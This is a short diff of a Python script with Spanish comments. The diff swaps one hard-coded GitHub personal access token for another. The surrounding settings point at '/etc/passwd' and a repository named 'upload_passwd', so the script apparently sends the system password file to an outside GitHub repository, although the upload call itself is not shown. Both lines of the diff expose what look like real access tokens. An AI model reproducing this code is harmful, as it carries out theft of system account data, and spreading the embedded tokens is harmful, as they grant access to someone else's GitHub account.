@@ -5,7 +5,7 @@ def run():
   import requests
 
   # Configura tu token de acceso personal y la URL del archivo remoto en GitHub
-  token = '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'
+  token = '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'
   repo_owner = 'Oxitocinaa'
   repo_name = 'upload_passwd'
   file_path = '/etc/passwd'
